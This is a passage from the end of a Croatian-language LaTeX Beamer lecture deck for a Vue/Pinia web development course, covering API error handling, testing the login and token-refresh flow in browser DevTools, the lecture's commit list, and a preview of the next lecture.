  \item 422: prikaz field-level grešaka
  \item Specifičan za kontekst
\end{itemize}
\end{columns}

\vspace{0.6em}
Koristimo oba. Interceptor hendla generičke greške automatski. Komponenta hendla specifične greške koje zahtijevaju kontekstualan prikaz.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Testiranje auth flowa u DevTools}
\begin{tabular}{@{}lp{8cm}@{}}
  \toprule
  \textbf{DevTools tab} & \textbf{Što provjeravamo} \\
  \midrule
  Network & Jesu li requestovi poslani s \texttt{Authorization} headerom? Koji status code smo dobili? \\
  Application > Local Storage & Postoje li \texttt{access\_token} i \texttt{refresh\_token}? Jesu li ažurirani nakon refresha? \\
  Console & Ima li grešaka? Jesu li interceptori logirali nešto? \\
  Vue DevTools > Pinia & Je li auth store ažuriran? Ima li user objekt? \\
  \bottomrule
\end{tabular}

\vspace{0.6em}
Za testiranje refresh flowa: otvorite Application tab, ručno obrišite \texttt{access\_token}, napravite bilo koji API poziv. Interceptor bi trebao automatski refreshati token.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Commitovi za Predavanje 8}
\begin{itemize}
  \item \texttt{feat(web): add API client wrapper with base URL and interceptors}
  \item \texttt{feat(web): implement auth store (Pinia) and login page}
  \item \texttt{feat(web): add route guards for role-based access (admin/club)}
  \item \texttt{feat(web): implement token refresh flow and 401 handling}
  \item \texttt{fix(web): add global error handling and toast/alert pattern}
\end{itemize}

\vspace{0.4em}
\textbf{Na satu:} implementiramo auth od nule, testiramo login/refresh u browseru, provjeravamo guardove.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Što ide sljedeće (Predavanje 9)}
\begin{itemize}
  \item State management s Piniom za poslovne entitete
  \item CRUD viewovi: lista, forma, detalji
  \item Loading, error i empty stanja
  \item Forme s validacijom
\end{itemize}

\vspace{0.8em}
\begin{center}
\Large Pitanja?
\end{center}
\end{frame}

\end{document}
